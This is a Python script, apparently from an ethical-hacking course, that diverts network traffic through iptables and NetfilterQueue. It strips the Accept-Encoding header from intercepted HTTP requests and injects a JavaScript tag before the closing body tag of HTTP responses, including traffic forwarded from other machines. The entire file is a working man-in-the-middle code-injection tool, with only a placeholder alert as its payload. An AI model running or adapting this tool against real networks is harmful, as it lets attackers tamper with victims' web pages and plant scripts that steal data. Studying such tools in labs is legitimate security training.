#import libraries and modules
import subprocess
import optparse
import scapy.all as scapy
import re
import netfilterqueue

def get_args():
    '''
    Get command line arguments
    '''

    parser = optparse.OptionParser()
    parser.add_option("-o", "--packet-origin", dest="packet_origin", default="own",help="Origin of packets: can be 'own' or 'remote'")

    (options, _) = parser.parse_args()

    if (options.packet_origin != "own") and (options.packet_origin != "remote"):
        parser.error("[-] Specify the origin of the packets using '-o <own/remote>' or use '--help' for more info")
        quit()
    else:
        return options.packet_origin

def set_load(packet, load):
    packet[scapy.Raw].load = load  # redirects to another url / location

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    # del scapy_packet[scapy.TCP].len #NOTE: TCP layer has no field named 'len', only UDP-layer like used in dns_spoof.py
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    regex = r"Accept-Encoding:.*?\\r\\n"  # '?' - means non-greedy --> this will stop after the FIRST occurence of the following expression (here: '\\r\\n'
    scapy_packet = scapy.IP(packet.get_payload())  #draping the original packet into a scapy-IP-layer wil automatically convert it into a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:  #to use scapy to check for HTTP requests and responses, check the TCP-layer -this layer contains sport (=source-port) and dport (=destination-port); if the sport is an HTTP-port, then the package contains an HTTP-response
                print("[+] Request")
                modified_load = re.sub(regex, '', load)  # remove 'Accept-Encoding'-field from load, in order to get unencoded text to analyse it further
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
                print(f">>> load: {load}")
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                replce = "</body>"
                replce_with = "<script>alert('test');</script></body>"
                modified_load = load.replace(replce, replce_with) # replace cloding body tag with Javascript code injection
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
                print(">>> Response Packet: ", scapy_packet.show())
            else:
                pass
        except UnicodeDecodeError:
            pass

    packet.accept()

print("===================")
print("Starting Code Injector")
print("===================")

packet_origin = get_args()
#enable packet routing of Kali machine
subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

if packet_origin == "remote":
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "666"])
elif packet_origin == "own":
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "666"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "666"])

try:
    queue = netfilterqueue.NetfilterQueue() # object that is going to interact with queue 666 created above
    queue.bind(666, process_packet) # binds variable 'queue' to 666 and executes a function on every packet in the queue
    queue.run()
except KeyboardInterrupt:
    print("Shutting down program...")
    print("Flushing IP Tables...")
    subprocess.run(["iptables","--flush"])
    subprocess.run(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
    print("IP Tables successfully reset.")
    exit()

